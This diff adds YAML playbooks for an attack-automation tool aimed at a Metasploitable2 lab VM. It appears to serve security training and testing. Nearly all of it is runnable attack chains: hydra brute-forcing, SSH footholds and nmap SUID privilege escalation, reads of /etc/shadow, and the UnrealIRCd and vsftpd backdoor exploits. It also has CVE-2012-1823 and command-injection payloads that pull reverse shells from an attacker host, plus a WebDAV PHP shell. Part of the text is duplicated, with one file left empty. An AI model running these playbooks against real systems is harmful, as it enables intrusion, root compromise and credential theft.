@@ -1,0 +1,939 @@
+ssh_example.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. scan the metasploitable-vm
+#     2. bruteforce a user
+#     3. login via ssh using the bruteforced pw
+#     4. upload linpeas and execute it
+#     5. find nmap suid and exploit it
+#     6. execute commands as root
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install nmap, hydra, wget and seclists
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+
+commands:
+  - type: shell
+    cmd: nmap -A -T4 $METASPLOITABLE
+
+  - type: shell
+    cmd: hydra -l user -P $PASSWDLIST $METASPLOITABLE ftp
+
+  # Parse the output of hydra and isolate the bruteforced password.
+  # The password will be stored in the variable $USERPW
+  - type: regex
+    cmd: ".*login: user.+password: (.+)"
+    output:
+      USERPW: "$MATCH_0"
+
+  # Print out the password
+  - type: debug
+    cmd: "Password found: $USERPW"
+
+  # Login via ssh using the bruteforced password
+  - type: ssh
+    cmd: id
+    username: user
+    password: "$USERPW"
+    hostname: $METASPLOITABLE
+    creates_session: "foothold"
+
+  # create a local tempfile for linpeas
+  - type: mktemp
+    variable: LINPEAS
+
+  # download linpeas locally
+  - type: shell
+    cmd: wget -O $LINPEAS https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+  # upload linpeas using the previously created ssh-session
+  - type: sftp
+    cmd: put
+    local_path: $LINPEAS
+    remote_path: /tmp/linpeas.sh
+    session: "foothold"
+    mode: "777"
+
+  - type: debug
+    cmd: "Executing LinPeas. This will take a while. Please be patient"
+
+  # Execute linpeas in interactive mode. The command_timeout
+  # is set to 0 because linpeas runs very long without any
+  # output. AttackMate will run until the output of the commands
+  # ends with a prompt.
+  - type: ssh
+    cmd: "bash /tmp/linpeas.sh\n"
+    save: /tmp/linpeas_output.txt
+    exit_on_error: False
+    interactive: True
+    command_timeout: 0
+
+  # prepare the privilege escalation
+  - type: ssh
+    cmd: echo "os.execute('/bin/sh')" > somefile
+    session: foothold
+
+  # nmap has suid-permissions. we can escape by
+  # executing our payload as a script. We need
+  # an interactive shell so that we can run all
+  # further commands with root-permissions
+  - type: ssh
+    cmd: "nmap --script=./somefile localhost\n"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: "id\n"
+    session: foothold
+    interactive: True
+
+  # proof that we have root permissions by
+  # reading out the shadow-file
+  - type: ssh
+    cmd: "grep root /etc/shadow\n"
+    session: foothold
+    interactive: True
+
+----------------------------
+
+upgrade_to_meterpreter.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Exploit the unreal_irc_backdoor
+#     2. Execute command in reverse-shell
+#     3. Upgrade reverse-shell to meterpreter shell
+#     4. Execute commands in meterpreter shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: "192.168.10.225"
+  ATTACKER: "172.17.0.127"
+  PAYLOAD: cmd/unix/reverse_perl
+  LPORT: "4422"
+
+commands:
+  # Perform Unreal-Irc-Backdoor-Exploit
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/unix/irc/unreal_ircd_3281_backdoor
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    options:
+      RHOSTS: $METASPLOITABLE
+
+  # Execute unix-command 'id' via reverse-shell
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  # Upgrade reverse-shell to meterpreter-shell
+  - type: msf-module
+    creates_session: upgraded
+    cmd: post/multi/manage/shell_to_meterpreter
+    options:
+      SESSION: $LAST_MSF_SESSION
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: "4433"
+
+  # Execute meterpreter-command 'sysinfo'
+  - type: msf-session
+    session: upgraded
+    stdapi: True
+    cmd: sysinfo
+
+----------------------------
+
+webserv.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create a temporary file for the reverse-shell payload
+#     2. Generate the payload
+#     3. Serve the payload via webserv in background
+#     4. Exploit CVE-2012-1823 and inject a command to download the reverse shell
+#     5. Start a muli handler to listen for the reverse shell
+#     6. Exploit CVE-2012-1823 and inject a command to execute the reverse shell
+#     7. Run commands in the reverse shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install curl
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: 4344
+  CURL: 'curl -XPOST "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
+
+commands:
+  # create a temporary file for a reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  # generate reverse shell
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    format: elf
+    local_path: $RSHELL
+
+  # serve the reverse shell via webserver in background mode
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # Inject code that downloads the reverse shell from the webserver in background mode
+  - type: shell
+    cmd: "$CURL -d \"<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL')?>\""
+
+  # Start a reverse shell listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  # Execute the reverse shell
+  - type: shell
+    cmd: "$CURL -d \"<?php system('chmod +x /tmp/shell && /tmp/shell &')?>\""
+    background: true
+    kill_on_exit: true
+
+  # Run commands using the reverse shell
+  - type: msf-session
+    session: shell
+    cmd: sysinfo
+
+  - type: msf-session
+    session: shell
+    cmd: getuid
+
+----------------------------
+
+webdemo.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create a staged reverse shell that uses a curl command
+#     2. Store payload in a variable(RESULT_STDOUT)
+#     3. Create a variable for the command injection: '; PAYLOAD #'
+#     4. Start a listener(in background) for the reverse shell using metasploit
+#     5. Perform the http-request that triggers the command injection
+#     6. Execute commands via reverse shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: cmd/linux/http/x86/meterpreter/reverse_tcp
+  LPORT: 4401
+
+commands:
+  - type: mktemp
+    variable: RSHELL
+
+  # generate a staged reverse shell
+  # use a fetch-payload(curl) for the cmdstager
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+      FETCH_WRITABLE_DIR: /tmp
+      FETCH_SRVHOST: $ATTACKER
+      FETCH_SRVPORT: 8080
+    format: raw
+    local_path: ${RSHELL}
+
+  # save payload in variable
+  - type: shell
+    cmd: cat $RSHELL
+
+  # prepare the command-injection-payload
+  - type: setvar
+    variable: CMDSTAGE
+    cmd: "; $RESULT_STDOUT #"
+
+  # start shell-listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+      FETCH_WRITABLE_DIR: /tmp
+      FETCH_SRVHOST: $ATTACKER
+      FETCH_SRVPORT: 8080
+    background: true
+    kill_on_exit: true
+
+  # execute the command injection and trigger the reverse shell download
+  - type: http-client
+    cmd: POST
+    url: http://$METASPLOITABLE/mutillidae/index.php?page=dns-lookup.php
+    data:
+      target_host: $CMDSTAGE
+      dns-lookup-php-submit-button: "Lookup+DNS"
+    background: true
+    kill_on_exit: true
+
+  # execute a command via reverse shell
+  - type: msf-session
+    session: shell
+    cmd: getuid
+
+  # execute a command via reverse shell
+  - type: msf-session
+    session: shell
+    cmd: ls
+
+----------------------------
+
+regex.yml
+file content ...
+
+# Author: Thorina Boenke
+# Description:
+#     This playbook demonstrates different modes of the regex command:
+#     1. Sets a variable as input string for the regex commands
+#     2. runs different regex commands
+#     3. displays the Outputvariable of the regex command with debug sommand
+#
+
+commands:
+
+  - type: setvar
+    variable: $INPUT
+    cmd: "6667/tcp open  irc UnrealIRCd"
+
+  # MODE FINDALL
+  - type: regex
+    input: INPUT
+    cmd: "666"
+    mode: findall
+    output:
+        # {'MATCH_0': '666'}
+        FIRST_MATCH: "$MATCH_0"
+
+  - type: debug
+    cmd: "Match: $FIRST_MATCH"
+
+  # MODE SPLIT
+  - type: regex
+    input: INPUT
+    cmd: "\ +"
+    mode: split
+    output:
+        # {'MATCH_0': '6667/tcp', 'MATCH_1': 'open', 'MATCH_2': 'irc', 'MATCH_3': 'UnrealIRCd\n'}
+        UNREALPORT: "$MATCH_0"
+
+  - type: debug
+    cmd: "Port: $UNREALPORT"
+
+  # MODE SEARCH
+  - type: regex
+    input: INPUT
+    cmd: tcp
+    mode: search
+    output:
+        # {'MATCH_0': 'tcp'}
+        SEARCH: "$MATCH_0"
+
+  - type: debug
+    cmd: "Search Result: $SEARCH"
+
+    # MODE SUB
+  - type: regex
+    input: INPUT
+    replace: SUBSTITUTION
+    cmd: tcp
+    mode: sub
+    output:
+        # {'MATCH_0': '6667/SUBSTITUTION open  irc UnrealIRCd'}
+        SUBSTITUTED: "$MATCH_0"
+
+  - type: debug
+    cmd: "Result string: $SUBSTITUTED"
+
+  
+
+
+----------------------------
+
+output_1.txt
+file content ...
+
+ssh_example.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. scan the metasploitable-vm
+#     2. bruteforce a user
+#     3. login via ssh using the bruteforced pw
+#     4. upload linpeas and execute it
+#     5. find nmap suid and exploit it
+#     6. execute commands as root
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install nmap, hydra, wget and seclists
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+
+commands:
+  - type: shell
+    cmd: nmap -A -T4 $METASPLOITABLE
+
+  - type: shell
+    cmd: hydra -l user -P $PASSWDLIST $METASPLOITABLE ftp
+
+  # Parse the output of hydra and isolate the bruteforced password.
+  # The password will be stored in the variable $USERPW
+  - type: regex
+    cmd: ".*login: user.+password: (.+)"
+    output:
+      USERPW: "$MATCH_0"
+
+  # Print out the password
+  - type: debug
+    cmd: "Password found: $USERPW"
+
+  # Login via ssh using the bruteforced password
+  - type: ssh
+    cmd: id
+    username: user
+    password: "$USERPW"
+    hostname: $METASPLOITABLE
+    creates_session: "foothold"
+
+  # create a local tempfile for linpeas
+  - type: mktemp
+    variable: LINPEAS
+
+  # download linpeas locally
+  - type: shell
+    cmd: wget -O $LINPEAS https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+  # upload linpeas using the previously created ssh-session
+  - type: sftp
+    cmd: put
+    local_path: $LINPEAS
+    remote_path: /tmp/linpeas.sh
+    session: "foothold"
+    mode: "777"
+
+  - type: debug
+    cmd: "Executing LinPeas. This will take a while. Please be patient"
+
+  # Execute linpeas in interactive mode. The command_timeout
+  # is set to 0 because linpeas runs very long without any
+  # output. AttackMate will run until the output of the commands
+  # ends with a prompt.
+  - type: ssh
+    cmd: "bash /tmp/linpeas.sh\n"
+    save: /tmp/linpeas_output.txt
+    exit_on_error: False
+    interactive: True
+    command_timeout: 0
+
+  # prepare the privilege escalation
+  - type: ssh
+    cmd: echo "os.execute('/bin/sh')" > somefile
+    session: foothold
+
+  # nmap has suid-permissions. we can escape by
+  # executing our payload as a script. We need
+  # an interactive shell so that we can run all
+  # further commands with root-permissions
+  - type: ssh
+    cmd: "nmap --script=./somefile localhost\n"
+    session: foothold
+    interactive: True
+
+  - type: ssh
+    cmd: "id\n"
+    session: foothold
+    interactive: True
+
+  # proof that we have root permissions by
+  # reading out the shadow-file
+  - type: ssh
+    cmd: "grep root /etc/shadow\n"
+    session: foothold
+    interactive: True
+
+----------------------------
+
+upgrade_to_meterpreter.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Exploit the unreal_irc_backdoor
+#     2. Execute command in reverse-shell
+#     3. Upgrade reverse-shell to meterpreter shell
+#     4. Execute commands in meterpreter shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: "192.168.10.225"
+  ATTACKER: "172.17.0.127"
+  PAYLOAD: cmd/unix/reverse_perl
+  LPORT: "4422"
+
+commands:
+  # Perform Unreal-Irc-Backdoor-Exploit
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/unix/irc/unreal_ircd_3281_backdoor
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    options:
+      RHOSTS: $METASPLOITABLE
+
+  # Execute unix-command 'id' via reverse-shell
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  # Upgrade reverse-shell to meterpreter-shell
+  - type: msf-module
+    creates_session: upgraded
+    cmd: post/multi/manage/shell_to_meterpreter
+    options:
+      SESSION: $LAST_MSF_SESSION
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: "4433"
+
+  # Execute meterpreter-command 'sysinfo'
+  - type: msf-session
+    session: upgraded
+    stdapi: True
+    cmd: sysinfo
+
+----------------------------
+
+webserv.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create a temporary file for the reverse-shell payload
+#     2. Generate the payload
+#     3. Serve the payload via webserv in background
+#     4. Exploit CVE-2012-1823 and inject a command to download the reverse shell
+#     5. Start a muli handler to listen for the reverse shell
+#     6. Exploit CVE-2012-1823 and inject a command to execute the reverse shell
+#     7. Run commands in the reverse shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install curl
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: 4344
+  CURL: 'curl -XPOST "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
+
+commands:
+  # create a temporary file for a reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  # generate reverse shell
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    format: elf
+    local_path: $RSHELL
+
+  # serve the reverse shell via webserver in background mode
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # Inject code that downloads the reverse shell from the webserver in background mode
+  - type: shell
+    cmd: "$CURL -d \"<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL')?>\""
+
+  # Start a reverse shell listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  # Execute the reverse shell
+  - type: shell
+    cmd: "$CURL -d \"<?php system('chmod +x /tmp/shell && /tmp/shell &')?>\""
+    background: true
+    kill_on_exit: true
+
+  # Run commands using the reverse shell
+  - type: msf-session
+    session: shell
+    cmd: sysinfo
+
+  - type: msf-session
+    session: shell
+    cmd: getuid
+
+----------------------------
+
+webdemo.yml
+file content ...
+
+
+----------------------------
+
+http-put_example.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create php-reverseshell-payload
+#     2. Start reverseshell-listener in background
+#     3. Upload php-reverseshell-payload via webdav
+#     4. Execute php-reverseshell-payload via http-get in background
+#     6. execute commands via reverseshell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: php/meterpreter/reverse_tcp
+  LPORT: 4410
+
+commands:
+  - type: mktemp
+    variable: RSHELL
+
+  # generate reverse-shell
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    format: raw
+    local_path: ${RSHELL}.php
+
+  # start shell-listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  # upload shell via webdav
+  - type: http-client
+    cmd: PUT
+    url: http://$METASPLOITABLE/dav/shell.php
+    local_path: ${RSHELL}.php
+
+  # wait two seconds
+  - type: sleep
+    seconds: 2
+
+  # execute shell via http-get in background
+  - type: http-client
+    cmd: GET
+    url: http://$METASPLOITABLE/dav/shell.php
+    background: true
+    kill_on_exit: true
+
+  # execute command in reverse-shell
+  - type: msf-session
+    stdapi: True
+    cmd: getuid
+    session: shell
+
+  - type: msf-session
+    cmd: sysinfo
+    session: shell
+
+  - type: debug
+    varstore: True
+
+  - type: msf-module
+    cmd: exploit/linux/local/udev_netlink
+    creates_session: root
+    payload: linux/x86/meterpreter/reverse_tcp
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: 4448
+    session: shell
+
+  - type: msf-session
+    cmd: getuid
+    session: root
+
+  - type: msf-session
+    cmd: cat /etc/shadow
+    session: root
+
+----------------------------
+
+only_if.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Scan the metasploitable-vm using nmap
+#     2. Parse the output of the scan to get the http-port
+#     6. Execute nikto-scan only if http-port is port 80
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Install nmap, nikto
+#     4. Target a Metasploitable2-VM
+#
+vars:
+  NMAP: /usr/bin/nmap
+  METASPLOITABLE: 172.17.0.106
+
+commands:
+  # Perform nmap scan
+  - type: shell
+    cmd: $NMAP -p 80 $METASPLOITABLE
+
+  # Parse output of nmap-scan to
+  # grep the port-number of the http service
+  - type: regex
+    cmd: (\d+)/tcp open  http
+    input: RESULT_STDOUT
+    output:
+      PORT: $MATCH_0
+
+  # Print port for debugging purposes
+  - type: debug
+    cmd: $PORT
+
+  # Run nikto only if http-port is port 80
+  - type: shell
+    cmd: nikto -host $METASPLOITABLE -port $PORT
+    only_if: $PORT == 80
+    exit_on_error: False
+
+----------------------------
+
+include.yml
+file content ...
+
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Execute exploit/unix/ftp/vsftpd_234_backdoor
+#     2. Run command using the spawned session
+#     3. Set variable UPGRADESESSION to the session-name
+#     4. Perform commands to make the shell more interactive
+#     5. Run commands on the upgraded shell
+#     6. Execute multiple post-exploitation-modules to gather info
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: cmd/unix/interact
+  INCLUDE_PATH: ./playbooks/includes
+
+commands:
+  - type: debug
+    cmd: "Please note that 'exploit/unix/ftp/vsftpd_234_backdoor' takes a while and might not always work"
+
+  # Exploit backdoor in vsftpd
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/unix/ftp/vsftpd_234_backdoor
+    payload: $PAYLOAD
+    options:
+      RHOSTS: $METASPLOITABLE
+      RPORT: 21
+
+  # Run command in spawned shell
+  - type: msf-session
+    session: shell
+    cmd: id
+
+  # set variable UPGRADESESSION
+  # the included upgrade_shell.yml depends
+  # on that variable
+  - type: setvar
+    cmd: shell
+    variable: UPGRADESESSION
+
+  # include commands from an external
+  # yaml-file
+  - type: include
+    local_path: $INCLUDE_PATH/upgrade_shell.yml
+
+  # run commands using the upgraded shell
+  - type: msf-session
+    session: shell
+    cmd: ps -aux
+
+  # set variable GATHER_SESSION
+  # the included gather_commands.yml depends
+  # on that variable
+  - type: setvar
+    cmd: $LAST_MSF_SESSION
+    variable: GATHER_SESSION
+
+  # include commands and gather/loot information
+  - type: include
+    local_path: $INCLUDE_PATH/gather_commands.yml
+
+----------------------------
+
+includes/upgrade_shell.yml
+file content ...
+
+commands:
+  - type: debug
+    varstore: True
+
+  - type: msf-session
+    cmd: python -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: $UPGRADESESSION
+
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: $UPGRADESESSION
+
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: $UPGRADESESSION
+
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: $UPGRADESESSION
+
+  - type: msf-session
+    cmd: 'export PS1=" >"'
+    session: $UPGRADESESSION
+
+----------------------------
+
+includes/gather_commands.yml
+file content ...
+
+commands:
+  - type: msf-module
+    cmd: post/linux/gather/checkvm
+    options:
+      SESSION: $GATHER_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/checkcontainer
+    options:
+      SESSION: $GATHER_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_network
+    options:
+      SESSION: $GATHER_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_users_history
+    options:
+      SESSION: $GATHER_SESSION
+
+  - type: msf-module
+    cmd: post/linux/gather/enum_protections
+    options:
+      SESSION: $GATHER_SESSION
+
+----------------------------
+
